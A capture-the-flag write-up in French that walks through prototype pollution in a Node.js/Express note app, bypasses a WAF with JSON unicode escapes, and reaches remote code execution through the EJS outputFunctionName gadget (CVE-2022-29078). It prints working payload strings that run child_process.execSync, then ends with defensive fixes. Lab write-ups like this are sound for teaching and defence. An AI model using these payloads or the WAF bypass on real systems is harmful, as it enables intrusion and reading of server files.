# SwiftNotes — pollution de prototype → RCE EJS

- **Auteur :** lyons
- **Cible :** `http://<HOST>:<PORT>` (application de prise de notes Node.js/Express, moteur EJS)
- **Catégorie :** web
- **Flag :** `CTF{REDACTED}` (cf. la règle de non-persistance des flags)
- **Fichiers fournis :** `server.js`, `package.json`

## Phase de repérage

`server.js` met à disposition un point d'entrée de synchronisation des préférences :

```js
app.post('/api/settings', requireAuth, (req, res) => {
  const user = users[req.session.username];
  merge(user.settings, req.body || {});
  res.json({ ok: true, settings: user.settings });
});
```

`merge` provient de `./utils/merge` (absent des fichiers livrés). Ce qui a été observé :
la routine duplique récursivement les objets, assigne sans détour fonctions et feuilles, et
finit donc par descendre dans `__proto__` → **prototype pollution**.

Autres éléments à retenir :

- le moteur de templates est **EJS** (`app.set('view engine', 'ejs')`) ;
- `app.set('view cache', false)` → le template est recompilé à chaque appel de `res.render` ;
- `package.json` : `"ejs": "^3.1.0"` (la version déployée est vulnérable, `< 3.1.7`).

## Déroulé de l'attaque

### 1. Contournement du WAF

Un `POST /api/settings` portant `{"__proto__":{...}}` se heurte à
`403 {"error":"request blocked by security policy"}`. Le WAF inspecte la chaîne telle
quelle, sans décoder les séquences d'échappement JSON. En passant par un encodage `\uXXXX` :

```python
esc = lambda s: ''.join('\\u%04x' % ord(c) for c in s)
# '__proto__'         -> "\u005f\u005fproto\u005f\u005f"
# 'outputFunctionName'-> "\u006f\u0075\u0074...\u004e\u0061\u006d\u0065"
```

la requête est acceptée (200) et `JSON.parse` reconstitue les clés réelles.

### 2. Sonde canari sans shell

L'objectif : départager les cas « pollution absente », « EJS déjà corrigé » et « commande
qui échoue » :

```python
val = "x;locals.settings.flag='EXECUTED_OK';s"
```

Une fois le `POST /api/settings` envoyé puis le `GET /settings` consulté, `flag: "EXECUTED_OK"`
s'affiche → pollution comme gadget EJS se trouvent validés.

### 3. Exécution de code à distance

Le gadget `outputFunctionName` (EJS < 3.1.7) :
`var <outputFunctionName> = __append;` → la valeur est insérée verbatim dans le template.

```python
cmd = "cat /data/flag.txt"
val = ("x;var cp=process.getBuiltinModule?process.getBuiltinModule('child_process')"
       ":process.mainModule.require('child_process');"
       "locals.settings.flag=String(cp.execSync(%s));s" % json.dumps(cmd))
```

Le code s'exécute en tête du rendu, et `locals` (= données de `res.render`) se trouve dans
la portée ; la sortie est rangée dans `locals.settings.flag`, que la page expose grâce à
`JSON.stringify(settings)`.

### 4. Où se cache le flag

Exécution en tant que `root` à l'intérieur d'un conteneur. `entrypoint.sh` révèle que
`$FLAG` est déposé dans `/data/flag.txt` (chmod 444) puis effacé de l'environnement. Un
`find / -iname '*flag*'` vient confirmer `/data/flag.txt`.

## Résultat obtenu

```
CTF{REDACTED}
```

## Recommandations de défense

- Combiner des entrées utilisateur au moyen d'un merge qui écarte `__proto__`, `constructor`,
  `prototype` (ou passer par `Object.create(null)` / `structuredClone`).
- Passer à EJS ≥ 3.1.7 (validation stricte des options, `hasOwnOnlyObject`).
- Un WAF qui filtre la chaîne brute n'arrête pas un payload encodé : la validation doit se
  faire côté applicatif, pas sur la chaîne.

## Sources

- CVE-2022-29078
